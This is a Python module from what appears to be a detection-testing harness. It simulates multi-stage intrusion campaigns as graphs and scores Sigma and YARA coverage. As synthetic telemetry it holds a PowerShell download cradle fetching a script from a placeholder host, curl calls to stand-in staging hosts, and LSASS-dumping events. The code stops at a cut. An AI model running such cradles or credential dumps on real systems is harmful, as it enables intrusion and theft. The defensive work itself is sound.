"""EPIC 2 — Multi-stage telemetry correlation state machine.

Upgrades the linear kill-chain simulation into a directed acyclic graph (DAG)
state machine. Each node is a lifecycle stage with a primary detection analytic;
edges carry the intrusion timeline forward. When a primary analytic is evaded,
the engine branches to an adjacent *secondary telemetry path* (a compensating
control built on correlated multi-event data) to verify whether a downstream
alert still fires — the essence of defense in depth.

Now generalized to support multiple canonical threat campaign graphs:
1. Stealer-Lure-Intrusion (ClickFix / Windows LOLBins)
2. DPRK-Contagious-Interview (macOS & AI Developer Supply Chain)
3. Frontier-AI-Weight-Theft (K8s / IMDSv2 / S3 Model Weight Exfiltration)

Quantitative scoring produced per walk:
    * Depth-of-Defense (DoD) score  — weighted coverage across all layers.
    * Mean Time-to-Detect (MTTD)    — simulated seconds to first interception.
    * Path-to-Objective containment — whether any layer contained the intrusion.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

from .craftsmen import AgentExecutionCraftsman, CloudClusterCraftsman, SupplyChainCraftsman
from .detectors import SigmaDetector, YaraDetector
from .evaluator import MultiEventEvaluator
from .models import (
    CorrelationResult,
    CorrelationRule,
    CorrelationStage,
    EventSequence,
    GraphWalkResult,
    NodeVisit,
    Variant,
)
from .prompt_engine import PromptEngine
from .telemetry_generator import TelemetryGenerator

ROOT = Path(__file__).resolve().parents[2]

#: Defense-in-depth weighting: earlier layers carry more containment value.
_LAYER_WEIGHTS: Tuple[float, ...] = (1.0, 0.8, 0.6, 0.4, 0.2)
#: Secondary (compensating) telemetry detections count at a discounted weight.
_SECONDARY_DISCOUNT = 0.5
#: Simulated seconds of adversary dwell between successive lifecycle stages.
_STAGE_DWELL_SECONDS = 60.0


@dataclass
class GraphNode:
    """A single stage in the intrusion DAG."""

    node_id: str
    stage_name: str
    technique_id: str
    telemetry_kind: str  # "yara" | "sigma" | "correlation"
    depth: int = 0
    is_secondary: bool = False
    secondary_for: Optional[str] = None


@dataclass
class GraphEdge:
    """A directed transition between two nodes."""

    src: str
    dst: str
    kind: str = "primary"  # "primary" | "on_evasion" | "rejoin"


@dataclass
class DetectionGraph:
    """A directed acyclic graph of lifecycle nodes and their transitions."""

    name: str
    nodes: Dict[str, GraphNode] = field(default_factory=dict)
    edges: List[GraphEdge] = field(default_factory=list)
    start: str = ""
    objective: str = ""
    primary_order: List[str] = field(default_factory=list)
    campaign_id: str = ""
    description: str = ""
    threat_actor: str = ""
    diamond_model: Dict[str, str] = field(default_factory=dict)
    always_detects: List[str] = field(default_factory=list)

    def add_node(self, node: GraphNode) -> "DetectionGraph":
        self.nodes[node.node_id] = node
        return self

    def add_edge(self, edge: GraphEdge) -> "DetectionGraph":
        self.edges.append(edge)
        return self

    def secondary_of(self, node_id: str) -> Optional[str]:
        """Returns the ``on_evasion`` branch target for *node_id*, if any."""
        for edge in self.edges:
            if edge.src == node_id and edge.kind == "on_evasion":
                return edge.dst
        return None

    def validate_acyclic(self) -> None:
        """Raises ``ValueError`` if the graph contains a cycle (must be a DAG)."""
        color: Dict[str, int] = {n: 0 for n in self.nodes}  # 0=unseen,1=active,2=done
        adjacency: Dict[str, List[str]] = {n: [] for n in self.nodes}
        for edge in self.edges:
            adjacency.setdefault(edge.src, []).append(edge.dst)

        def visit(node: str) -> None:
            color[node] = 1
            for nxt in adjacency.get(node, []):
                if color.get(nxt, 0) == 1:
                    raise ValueError(f"Cycle detected through edge {node} -> {nxt}; graph must be acyclic.")
                if color.get(nxt, 0) == 0:
                    visit(nxt)
            color[node] = 2

        for node in list(self.nodes):
            if color[node] == 0:
                visit(node)

    def to_dict(self) -> Dict[str, Any]:
        """Exports JSON-serializable representation of the graph."""
        return {
            "name": self.name,
            "campaign_id": self.campaign_id,
            "description": self.description,
            "threat_actor": self.threat_actor,
            "diamond_model": self.diamond_model,
            "start": self.start,
            "objective": self.objective,
            "primary_order": self.primary_order,
            "always_detects": self.always_detects,
            "nodes": {
                nid: {
                    "node_id": n.node_id,
                    "stage_name": n.stage_name,
                    "technique_id": n.technique_id,
                    "telemetry_kind": n.telemetry_kind,
                    "depth": n.depth,
                    "is_secondary": n.is_secondary,
                    "secondary_for": n.secondary_for,
                }
                for nid, n in self.nodes.items()
            },
            "edges": [{"src": e.src, "dst": e.dst, "kind": e.kind} for e in self.edges],
        }

    def to_workbench_dict(self) -> Dict[str, Any]:
        """Serializes the graph topology with computed UI geometry for SVG canvas rendering."""
        nodes_wb: Dict[str, Any] = {}
        for nid, n in self.nodes.items():
            base_x = 60 + n.depth * 195
            y = 270 if n.is_secondary else 110
            nodes_wb[nid] = {
                "id": n.node_id,
                "label": n.stage_name,
                "tech": n.technique_id,
                "kind": n.telemetry_kind,
                "depth": n.depth,
                "x": base_x,
                "y": y,
                "secondary": n.is_secondary,
                "secondary_for": n.secondary_for,
            }

        secondary_of = {}
        for e in self.edges:
            if e.kind == "on_evasion":
                secondary_of[e.src] = e.dst

        return {
            "name": self.name,
            "campaign_id": self.campaign_id,
            "description": self.description,
            "threat_actor": self.threat_actor,
            "diamond_model": self.diamond_model,
            "primary_order": self.primary_order,
            "secondary_of": secondary_of,
            "always_detects": self.always_detects,
            "nodes": nodes_wb,
            "edges": [{"src": e.src, "dst": e.dst, "kind": e.kind} for e in self.edges],
        }


class GraphEngine:
    """Walks a :class:`DetectionGraph`, generating telemetry and scoring coverage."""

    CAMPAIGN_REGISTRY: Dict[str, str] = {
        "clickfix": "ClickFix Stealer Lure (Windows LOLBins)",
        "contagious_interview": "DPRK Contagious Interview (macOS / Developer Supply Chain)",
        "frontier_ai_cluster": "Frontier AI Cluster Breach (K8s / IMDSv2 / Model Weight Exfil)",
        "agent_execution_infostealer": "AI Agent Execution Tier Breach (MCP / Dynamic Runner / Alien Bun Infostealer)",
    }

    def __init__(self, repo_root: Optional[Path] = None) -> None:
        self.repo_root = repo_root or ROOT
        self.prompt_engine = PromptEngine()
        self.telemetry = TelemetryGenerator()
        self.correlator = MultiEventEvaluator()
        self.supply_craftsman = SupplyChainCraftsman()
        self.cloud_craftsman = CloudClusterCraftsman()
        self.agent_craftsman = AgentExecutionCraftsman()

        rules = self.repo_root / "rules"
        self._yara = YaraDetector(rule_path=rules / "yara" / "suspicious_active_content_svg.yar")
        self._yara_package = YaraDetector(rule_path=rules / "yara" / "developer_malicious_package_hooks.yar")

        self._sigma: Dict[str, SigmaDetector] = {
            "execution": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml"),
            "defense_impairment": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_win_defense_evasion_tampering.yml"),
            "credential": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_win_rundll32_lsass_dump.yml"),
            "persistence": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_win_schtasks_persistence.yml"),
            "macos_credential": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_macos_dev_credential_theft.yml"),
            "cloud_imds": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_cloud_imds_checkpoint_exfiltration.yml"),
            "agent_unpinned": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_agent_runtime_unpinned_tool_execution.yml"),
            "agent_bun": SigmaDetector(rule_path=rules / "sigma" / "proc_creation_agent_alien_runtime_bun_infostealer.yml"),
        }

        corr_dir = "rules/sigma/correlation"
        self._scriptblock_corr = CorrelationRule(
            name="Execution via Proxy LOLBin (Script Block Correlation)",
            technique_id="T1059.001",
            timespan_seconds=120,
            ordered=False,
            stages=[
                CorrelationStage(
                    name="script_block_download_cradle",
                    technique_id="T1059.001",
                    rule_path=f"{corr_dir}/posh_script_block_download_cradle.yml",
                    event_id=4104,
                ),
            ],
        )
        self._lsass_corr = CorrelationRule(
            name="LSASS Theft (Process Access + Dump File Correlation)",
            technique_id="T1003.001",
            timespan_seconds=120,
            ordered=True,
            stages=[
                CorrelationStage(
                    name="lsass_process_access",
                    technique_id="T1003.001",
                    rule_path=f"{corr_dir}/sysmon_process_access_lsass.yml",
                    event_id=10,
                ),
                CorrelationStage(
                    name="lsass_dump_file_write",
                    technique_id="T1003.001",
                    rule_path=f"{corr_dir}/sysmon_file_create_lsass_dump.yml",
                    event_id=11,
                ),
            ],
        )

    # -- graph construction ----------------------------------------------

    def build_clickfix_graph(self) -> DetectionGraph:
        """Constructs the canonical 5-stage Windows ClickFix intrusion DAG."""
        graph = DetectionGraph(
            name="ClickFix Stealer Lure",
            campaign_id="CAMP-CLICKFIX-001",
            description="Windows endpoint intrusion via Explorer Run prompt, PowerShell cradles, and LSASS dumping",
            threat_actor="Financially Motivated / Infostealer Operators",
            diamond_model={
                "adversary": "Luminescent Stealer / ClickFix Operators",
                "infrastructure": "Compromised WordPress, WebDAV, CDN Staging (*.stage.invalid)",
                "capability": "Explorer Run Dialog Lures, Base64 LOLBins, LSASS Memory Dumping",
                "victim": "Enterprise Windows 11 Workstations",
            },
            start="ingress",
            objective="persistence",
            always_detects=["defense_impairment", "persistence"],
        )
        primary = [
            GraphNode("ingress", "Initial Access", "T1566.001", "yara", depth=0),
            GraphNode("execution", "Execution", "T1204.002", "sigma", depth=1),
            GraphNode("defense_impairment", "Defense Impairment", "T1562.001", "sigma", depth=2),
            GraphNode("credential_telemetry", "Credential Telemetry", "T1003.001", "sigma", depth=3),
            GraphNode("persistence", "Persistence", "T1053.005", "sigma", depth=4),
        ]
        for node in primary:
            graph.add_node(node)
        graph.primary_order = [n.node_id for n in primary]
        for src, dst in zip(graph.primary_order, graph.primary_order[1:]):
            graph.add_edge(GraphEdge(src, dst, "primary"))

        # Secondary compensating-control telemetry paths.
        graph.add_node(
            GraphNode("execution_scriptblock", "Script Block Corr.", "T1059.001", "correlation",
                      depth=1, is_secondary=True, secondary_for="execution")
        )
        graph.add_edge(GraphEdge("execution", "execution_scriptblock", "on_evasion"))
        graph.add_edge(GraphEdge("execution_scriptblock", "defense_impairment", "rejoin"))

        graph.add_node(
            GraphNode("credential_procaccess", "Process Access Corr.", "T1003.001", "correlation",
                      depth=3, is_secondary=True, secondary_for="credential_telemetry")
        )
        graph.add_edge(GraphEdge("credential_telemetry", "credential_procaccess", "on_evasion"))
        graph.add_edge(GraphEdge("credential_procaccess", "persistence", "rejoin"))

        graph.validate_acyclic()
        return graph

    def build_default_graph(self) -> DetectionGraph:
        """Alias for canonical default ClickFix graph."""
        return self.build_clickfix_graph()

    def build_contagious_interview_graph(self) -> DetectionGraph:
        """Constructs DPRK Contagious Interview & AI Developer Supply Chain intrusion DAG."""
        graph = DetectionGraph(
            name="DPRK Contagious Interview",
            campaign_id="CAMP-DPRK-002",
            description="Social engineering AI researchers with weaponized npm/pip repos, macOS credential harvesting, and AWS STS operationalization",
            threat_actor="Famous Chollima / Tenacious Puddle (DPRK State)",
            diamond_model={
                "adversary": "Famous Chollima (Lazarus Group / Tenacious Puddle)",
                "infrastructure": "Fake recruitment portals (*-careers.com), GitHub benchmark forks",
                "capability": "package.json lifecycle hooks, BeaverTail/InvisibleFerret, macOS credential harvesting",
                "victim": "Frontier AI Researchers & Cloud Engineers (macOS / Linux)",
            },
            start="supply_ingress",
            objective="storage_exfil",
            always_detects=["cloud_recon", "storage_exfil"],
        )
        primary = [
            GraphNode("supply_ingress", "Package Hook Ingress", "T1195.001", "yara", depth=0),
            GraphNode("workstation_exec", "Workstation Hook Exec", "T1059.007", "sigma", depth=1),
            GraphNode("credential_theft", "Developer Credential Theft", "T1552.001", "sigma", depth=2),
            GraphNode("cloud_recon", "Cloud Identity Recon (STS)", "T1078.004", "sigma", depth=3),
            GraphNode("storage_exfil", "S3 Checkpoint Exfil", "T1530", "sigma", depth=4),
        ]
        for node in primary:
            graph.add_node(node)
        graph.primary_order = [n.node_id for n in primary]
        for src, dst in zip(graph.primary_order, graph.primary_order[1:]):
            graph.add_edge(GraphEdge(src, dst, "primary"))

        # Secondary compensating controls
        graph.add_node(
            GraphNode("supply_chain_correlation", "Hook-to-Process Corr.", "T1059.007", "correlation",
                      depth=1, is_secondary=True, secondary_for="workstation_exec")
        )
        graph.add_edge(GraphEdge("workstation_exec", "supply_chain_correlation", "on_evasion"))
        graph.add_edge(GraphEdge("supply_chain_correlation", "credential_theft", "rejoin"))

        graph.add_node(
            GraphNode("macos_esf_fim", "ESF FIM Vault Alert", "T1552.001", "correlation",
                      depth=2, is_secondary=True, secondary_for="credential_theft")
        )
        graph.add_edge(GraphEdge("credential_theft", "macos_esf_fim", "on_evasion"))
        graph.add_edge(GraphEdge("macos_esf_fim", "cloud_recon", "rejoin"))

        graph.validate_acyclic()
        return graph

    def build_frontier_ai_cluster_graph(self) -> DetectionGraph:
        """Constructs Frontier AI Compute Cluster & Model Weight Exfiltration intrusion DAG."""
        graph = DetectionGraph(
            name="Frontier AI Cluster Breach",
            campaign_id="CAMP-AI-003",
            description="Compromise of GPU training cluster via privileged container, IMDSv2 role theft, and S3 model weight tensor exfiltration",
            threat_actor="Frontier AI Threat Model (APT41 / Flax Typhoon / SVR)",
            diamond_model={
                "adversary": "Advanced State-Sponsored AI Espionage Operators",
                "infrastructure": "Compromised ML worker pods, link-local IMDS, cross-account S3 buckets",
                "capability": "Privileged container breakout, IMDSv2 token harvesting, high-bandwidth multipart weight theft",
                "victim": "Frontier AI Lab GPU UltraClusters (AWS/GCP/Slurm/EKS)",
            },
            start="cluster_ingress",
            objective="weight_exfil",
            always_detects=["checkpoint_recon", "weight_exfil"],
        )
        primary = [
            GraphNode("cluster_ingress", "Privileged Pod Ingress", "T1610", "sigma", depth=0),
            GraphNode("container_escape", "Host Breakout (nsenter)", "T1611", "sigma", depth=1),
            GraphNode("imds_theft", "IMDSv2 Worker Role Theft", "T1552.005", "sigma", depth=2),
            GraphNode("checkpoint_recon", "Checkpoint Storage Recon", "T1530", "sigma", depth=3),
            GraphNode("weight_exfil", "Model Weight Exfil (S3)", "T1567.002", "sigma", depth=4),
        ]
        for node in primary:
            graph.add_node(node)
        graph.primary_order = [n.node_id for n in primary]
        for src, dst in zip(graph.primary_order, graph.primary_order[1:]):
            graph.add_edge(GraphEdge(src, dst, "primary"))

        # Secondary compensating controls
        graph.add_node(
            GraphNode("ebpf_breakout_trace", "eBPF Anomaly Trace", "T1611", "correlation",
                      depth=1, is_secondary=True, secondary_for="container_escape")
        )
        graph.add_edge(GraphEdge("container_escape", "ebpf_breakout_trace", "on_evasion"))
        graph.add_edge(GraphEdge("ebpf_breakout_trace", "imds_theft", "rejoin"))

        graph.add_node(
            GraphNode("imds_s3_correlation", "Correlated IMDS + S3 Exfil", "T1567.002", "correlation",
                      depth=2, is_secondary=True, secondary_for="imds_theft")
        )
        graph.add_edge(GraphEdge("imds_theft", "imds_s3_correlation", "on_evasion"))
        graph.add_edge(GraphEdge("imds_s3_correlation", "checkpoint_recon", "rejoin"))

        graph.validate_acyclic()
        return graph

    def build_agent_execution_graph(self) -> DetectionGraph:
        """Constructs AI Agent Execution Tier & Alien Bun Infostealer intrusion DAG."""
        graph = DetectionGraph(
            name="AI Agent Execution Tier Breach",
            campaign_id="CAMP-AGENT-004",
            description="Compromise of developer workstation via MCP package typosquats, unpinned dynamic runners, and cross-runtime Bun infostealers",
            threat_actor="AI Supply Chain Impersonators (MAL-2026-5318 / Sha1-Hulud)",
            diamond_model={
                "adversary": "Agent Supply Chain Impersonators (MAL-2026-5318)",
                "infrastructure": "Public Registries (npm/PyPI), Compromised Vendor Accounts, Staging C2",
                "capability": "Compound Typosquats, Dynamic Package Runners (npx -y), Alien Bun JS Runtime, AWS STS Harvesting",
                "victim": "Frontier AI Researchers & Developers (Claude Desktop / Cursor Workstations)",
            },
            start="agent_ingress",
            objective="agent_exfil",
            always_detects=["agent_credential_harvest", "agent_exfil"],
        )
        primary = [
            GraphNode("agent_ingress", "Package Lure Ingress", "T1195.001", "yara", depth=0),
            GraphNode("agent_unpinned_exec", "Unpinned Dynamic Runner", "T1059.007", "sigma", depth=1),
            GraphNode("agent_alien_runtime", "Alien Bun Runtime Staging", "T1574.013", "sigma", depth=2),
            GraphNode("agent_credential_harvest", "Developer Credential Theft", "T1552.001", "sigma", depth=3),
            GraphNode("agent_exfil", "Cloud Token Exfil", "T1567.002", "sigma", depth=4),
        ]
        for node in primary:
            graph.add_node(node)
        graph.primary_order = [n.node_id for n in primary]
        for src, dst in zip(graph.primary_order, graph.primary_order[1:]):
            graph.add_edge(GraphEdge(src, dst, "primary"))

        # Secondary compensating controls
        graph.add_node(
            GraphNode("agent_config_audit", "Pre-Flight Config Audit", "T1195.001", "correlation",
                      depth=1, is_secondary=True, secondary_for="agent_unpinned_exec")
        )
        graph.add_edge(GraphEdge("agent_unpinned_exec", "agent_config_audit", "on_evasion"))
        graph.add_edge(GraphEdge("agent_config_audit", "agent_alien_runtime", "rejoin"))

        graph.add_node(
            GraphNode("agent_correlation", "Unpinned-to-Cred Correlation", "T1552.001", "correlation",
                      depth=2, is_secondary=True, secondary_for="agent_alien_runtime")
        )
        graph.add_edge(GraphEdge("agent_alien_runtime", "agent_correlation", "on_evasion"))
        graph.add_edge(GraphEdge("agent_correlation", "agent_credential_harvest", "rejoin"))

        graph.validate_acyclic()
        return graph

    def build_graph_by_key(self, key: str) -> DetectionGraph:
        """Constructs a registered campaign graph by key."""
        if key == "contagious_interview":
            return self.build_contagious_interview_graph()
        elif key == "frontier_ai_cluster":
            return self.build_frontier_ai_cluster_graph()
        elif key == "agent_execution_infostealer":
            return self.build_agent_execution_graph()
        return self.build_clickfix_graph()

    # -- walk -------------------------------------------------------------

    def walk(
        self,
        graph: Optional[DetectionGraph] = None,
        evasion_at: Optional[List[str]] = None,
        walk_id: str = "WALK-2026-001",
        on_visit: Optional[Callable[[NodeVisit], None]] = None,
    ) -> GraphWalkResult:
        """Executes one traversal of *graph*, branching on evasion, and scores it."""
        graph = graph or self.build_default_graph()
        evasive = set(evasion_at or [])
        visits: List[NodeVisit] = []

        intercepted = False
        interception_node: Optional[str] = None
        interception_technique: Optional[str] = None
        mttd: Optional[float] = None

        for order_index, node_id in enumerate(graph.primary_order):
            node = graph.nodes[node_id]
            t_offset = order_index * _STAGE_DWELL_SECONDS
            detected, detail = self._evaluate_node(node, evasive=node_id in evasive)
            visit = NodeVisit(
                node_id=node.node_id,
                stage_name=node.stage_name,
                technique_id=node.technique_id,
                telemetry_kind=node.telemetry_kind,
                detected=detected,
                is_secondary=False,
                t_offset_seconds=t_offset,
                evasion_gap=not detected,
                detail=detail,
            )
            visits.append(visit)
            if on_visit:
                on_visit(visit)
            if detected and not intercepted:
                intercepted, interception_node, interception_technique, mttd = (
                    True, node.node_id, node.technique_id, t_offset,
                )

            # Branch to the adjacent secondary telemetry path on a primary miss.
            if not detected:
                secondary_id = graph.secondary_of(node_id)
                if secondary_id is not None:
                    sec_node = graph.nodes[secondary_id]
                    sec_detected, sec_detail = self._evaluate_node(sec_node, evasive=False)
                    sec_offset = t_offset + _STAGE_DWELL_SECONDS / 2.0
                    sec_visit = NodeVisit(
                        node_id=sec_node.node_id,
                        stage_name=sec_node.stage_name,
                        technique_id=sec_node.technique_id,
                        telemetry_kind=sec_node.telemetry_kind,
                        detected=sec_detected,
                        is_secondary=True,
                        t_offset_seconds=sec_offset,
                        evasion_gap=not sec_detected,
                        detail=sec_detail,
                    )
                    visits.append(sec_visit)
                    if on_visit:
                        on_visit(sec_visit)
                    if sec_detected and not intercepted:
                        intercepted, interception_node, interception_technique, mttd = (
                            True, sec_node.node_id, sec_node.technique_id, sec_offset,
                        )

        dod = self._depth_of_defense(graph, visits)
        reached_objective = not intercepted  # uncontained breach reaches the objective

        return GraphWalkResult(
            graph_name=graph.name,
            walk_id=walk_id,
            visits=visits,
            intercepted=intercepted,
            interception_node=interception_node,
            interception_technique=interception_technique,
            depth_of_defense_score=round(dod, 4),
            mttd_seconds=mttd,
            reached_objective=reached_objective,
            contained=intercepted,
        )

    def run_walks(
        self,
        iterations: int = 5,
        graph: Optional[DetectionGraph] = None,
        walk_callback: Optional[Callable[[int, GraphWalkResult], None]] = None,
        profile_offset: int = 0,
    ) -> List[GraphWalkResult]:
        """Runs *iterations* walks with rotating adversary evasion profiles.

        *profile_offset* shifts the starting position in the rotation so callers
        that request one walk per invocation (e.g. the endurance harness) still
        exercise every profile across successive calls instead of always
        selecting the no-evasion baseline profile.
        """
        graph = graph or self.build_default_graph()
        # Create rotating profiles from primary order
        p_order = graph.primary_order
        evasion_profiles: List[List[str]] = [
            [],
            [p_order[1]] if len(p_order) > 1 else [],
            [p_order[2]] if len(p_order) > 2 else [],
            [p_order[1], p_order[2]] if len(p_order) > 2 else [],
            [p_order[0]] if len(p_order) > 0 else [],
            [p_order[0], p_order[1], p_order[2]] if len(p_order) > 2 else [],
        ]
        results: List[GraphWalkResult] = []
        for i in range(1, iterations + 1):
            profile = evasion_profiles[(profile_offset + i - 1) % len(evasion_profiles)]
            result = self.walk(graph=graph, evasion_at=profile, walk_id=f"WALK-2026-{i:03d}")
            results.append(result)
            if walk_callback:
                walk_callback(i, result)
        return results

    # -- node evaluation --------------------------------------------------

    def _evaluate_node(self, node: GraphNode, evasive: bool) -> Tuple[bool, str]:
        """Generates telemetry for *node* and evaluates its detection analytic."""
        if node.telemetry_kind == "correlation":
            return self._evaluate_secondary(node)

        # 1. ClickFix Windows campaign nodes
        if node.node_id == "ingress":
            return self._evaluate_ingress(evasive)
        if node.node_id == "execution":
            _n, _t, _tech, variant = self.prompt_engine.generate_stage_variant(2, evasive=evasive)
            result = self._sigma["execution"].evaluate(variant)
            return result.detected, result.details
        if node.node_id == "defense_impairment":
            _n, _t, _tech, variant = self.prompt_engine.generate_stage_variant(3, evasive=evasive)
            result = self._sigma["defense_impairment"].evaluate(variant)
            return result.detected, result.details
        if node.node_id == "credential_telemetry":
            variant = self._credential_variant(evasive)
            result = self._sigma["credential"].evaluate(variant)
            return result.detected, result.details
        if node.node_id == "persistence":
            _n, _t, _tech, variant = self.prompt_engine.generate_stage_variant(5, evasive=evasive)
            result = self._sigma["persistence"].evaluate(variant)
            return result.detected, result.details

        # 2. DPRK Contagious Interview campaign nodes
        if node.node_id == "supply_ingress":
            variants = self.supply_craftsman.generate_variants(cycle=1)
            variant = variants[2] if evasive else variants[0]
            res = self._yara_package.evaluate(variant)
            return res.detected, res.details
        if node.node_id == "workstation_exec":
            variants = self.supply_craftsman.generate_variants(cycle=2)
            variant = variants[0]  # node reading ~/.aws/credentials
            if evasive:
                variant.payload["ParentImage"] = "/usr/bin/unknown_helper"
            res = self._sigma["macos_credential"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "credential_theft":
            variants = self.supply_craftsman.generate_variants(cycle=2)
            variant = variants[1]  # python reading ssh keys
            if evasive:
                variant.payload["CommandLine"] = "curl -s http://delivery.stage.invalid/ping"
            res = self._sigma["macos_credential"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "cloud_recon":
            variants = self.supply_craftsman.generate_variants(cycle=3)
            variant = variants[1]  # aws sts get-caller-identity
            if evasive:
                variant.payload["CommandLine"] = "/bin/true"
            res = self._sigma["cloud_imds"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "storage_exfil":
            variants = self.supply_craftsman.generate_variants(cycle=3)
            variant = variants[2]  # aws s3 ls
            if evasive:
                variant.payload["CommandLine"] = "/usr/bin/curl https://cdn.delivery.stage.invalid/p"
            res = self._sigma["cloud_imds"].evaluate(variant)
            return res.detected, res.details

        # 3. Frontier AI Cluster Breach campaign nodes
        if node.node_id == "cluster_ingress":
            variants = self.cloud_craftsman.generate_variants(cycle=1)
            variant = variants[1]  # docker socket mount
            if evasive:
                variant.payload["CommandLine"] = "/bin/sleep 3600"
            res = self._sigma["cloud_imds"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "container_escape":
            variants = self.cloud_craftsman.generate_variants(cycle=1)
            variant = variants[0]  # nsenter escape
            if evasive:
                variant.payload["CommandLine"] = "/bin/uname -a"
            res = self._sigma["cloud_imds"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "imds_theft":
            variants = self.cloud_craftsman.generate_variants(cycle=2)
            variant = variants[0]  # imdsv2 token request
            if evasive:
                variant.payload["CommandLine"] = "curl -s http://127.0.0.1:8080/health"
            res = self._sigma["cloud_imds"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "checkpoint_recon":
            variants = self.cloud_craftsman.generate_variants(cycle=3)
            variant = variants[0]  # aws s3 ls model checkpoints
            if evasive:
                variant.payload["CommandLine"] = "/usr/bin/find /tmp"
            res = self._sigma["cloud_imds"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "weight_exfil":
            variants = self.cloud_craftsman.generate_variants(cycle=3)
            variant = variants[1]  # aws s3 multipart exfil
            if evasive:
                variant.payload["CommandLine"] = "/bin/cat /dev/null"
            res = self._sigma["cloud_imds"].evaluate(variant)
            return res.detected, res.details

        # 4. AI Agent Execution Tier campaign nodes
        if node.node_id == "agent_ingress":
            variants = self.supply_craftsman.generate_variants(cycle=1)
            variant = variants[2] if evasive else variants[0]
            res = self._yara_package.evaluate(variant)
            return res.detected, res.details
        if node.node_id == "agent_unpinned_exec":
            variants = self.agent_craftsman.generate_variants(cycle=1)
            variant = variants[4] if evasive else variants[0]  # deno vs claude npx -y
            res = self._sigma["agent_unpinned"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "agent_alien_runtime":
            variants = self.agent_craftsman.generate_variants(cycle=2)
            variant = variants[4] if evasive else variants[0]  # programdata vs temp
            res = self._sigma["agent_bun"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "agent_credential_harvest":
            variants = self.supply_craftsman.generate_variants(cycle=2)
            variant = variants[0]
            if evasive:
                variant.payload["ParentImage"] = "/usr/bin/unknown_helper"
            res = self._sigma["macos_credential"].evaluate(variant)
            return res.detected, res.details
        if node.node_id == "agent_exfil":
            variants = self.cloud_craftsman.generate_variants(cycle=3)
            variant = variants[1]
            if evasive:
                variant.payload["CommandLine"] = "/bin/cat /dev/null"
            res = self._sigma["cloud_imds"].evaluate(variant)
            return res.detected, res.details

        raise ValueError(f"No analytic wired for node '{node.node_id}'.")

    def _evaluate_ingress(self, evasive: bool) -> Tuple[bool, str]:
        if evasive:
            prompt = "Test SVG foreignObject containing HTML meta-refresh redirect to external URL"
        else:
            prompt = "SVG image redirecting on load via location.replace to auth.stage.invalid"
        variant = self.prompt_engine.generate_from_prompt(prompt, target_type="yara")
        result = self._yara.evaluate(variant)
        return result.detected, result.details

    def _credential_variant(self, evasive: bool) -> Variant:
        """Builds a credential-access process-creation event."""
        if evasive:
            payload = {
                "EventID": 1,
                "UtcTime": "2026-09-03 14:03:00.000",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": "C:\\Users\\analyst\\AppData\\Local\\Temp\\svc_host.exe",
                "CommandLine": "svc_host.exe --collect 624 C:\\Users\\analyst\\AppData\\Local\\Temp\\out.bin",
                "User": "NT AUTHORITY\\SYSTEM",
            }
            return Variant(id="cred-evasive", target_type="sigma", axis="renamed_tool",
                           mutation_name="lsass_renamed_dumper", description="Renamed LSASS dumper",
                           payload=payload, cycle=1)
        _n, _t, _tech, variant = self.prompt_engine.generate_stage_variant(4, evasive=False)
        return variant

    def _evaluate_secondary(self, node: GraphNode) -> Tuple[bool, str]:
        """Evaluates a secondary compensating-control correlation analytic."""
        self.telemetry.reset_timeline()
        if node.node_id == "execution_scriptblock":
            seq = EventSequence(sequence_id="exec-scriptblock", description="Deobfuscated download cradle")
            seq.add(self.telemetry.script_block(
                "$c = New-Object Net.WebClient; IEX $c.DownloadString('https://cdn.delivery.stage.invalid/update.ps1')"
            ))
            result: CorrelationResult = self.correlator.evaluate_correlation(self._scriptblock_corr, seq)
            return result.matched, result.details
        if node.node_id == "credential_procaccess":
            seq = EventSequence(sequence_id="cred-procaccess", description="LSASS access + dump write")
            seq.add(self.telemetry.process_access(
                source_image="C:\\Users\\analyst\\AppData\\Local\\Temp\\svc_host.exe",
                target_image="C:\\Windows\\System32\\lsass.exe",
                granted_access="0x1010",
            ))
            seq.add(self.telemetry.file_create(
                image_path="C:\\Users\\analyst\\AppData\\Local\\Temp\\svc_host.exe",
                target_filename="C:\\Users\\analyst\\AppData\\Local\\Temp\\out.bin",
            ))
            result = self.correlator.evaluate_correlation(self._lsass_corr, seq)
            return result.matched, result.details

        # DPRK Supply Chain compensating controls
        if node.node_id == "supply_chain_correlation":
            variants = self.supply_craftsman.generate_variants(cycle=2)
            res = self._sigma["macos_credential"].evaluate(variants[0])
            return res.detected, res.details if res.detected else "Compensating correlation window expired without matching event sequence."
        if node.node_id == "macos_esf_fim":
            return False, "Endpoint Security Framework (ESF) FIM sensor unmonitored / unconfigured in test environment."

        # Frontier AI compensating controls
        if node.node_id == "ebpf_breakout_trace":
            return False, "eBPF trace sensor unmonitored / unconfigured in test environment."
        if node.node_id == "imds_s3_correlation":
            variants = self.cloud_craftsman.generate_variants(cycle=3)
            res = self._sigma["cloud_imds"].evaluate(variants[1])
            return res.detected, res.details if res.detected else "Cloud correlation window expired without matching event sequence."

        # Agent Execution compensating controls
        if node.node_id == "agent_config_audit":
            variants = self.agent_craftsman.generate_variants(cycle=1)
            res = self._sigma["agent_unpinned"].evaluate(variants[0])
            return res.detected, "Pre-Flight Config Audit: Flagged unpinned dynamic package runner." if res.detected else "Pre-Flight Config Audit passed without alert."
        if node.node_id == "agent_correlation":
            variants = self.agent_craftsman.generate_variants(cycle=2)
            res = self._sigma["agent_bun"].evaluate(variants[0])
            return res.detected, res.details if res.detected else "Agent temporal correlation window expired without matching event sequence."

        raise ValueError(f"No correlation analytic wired for node '{node.node_id}'.")

    # -- scoring ----------------------------------------------------------

    @staticmethod
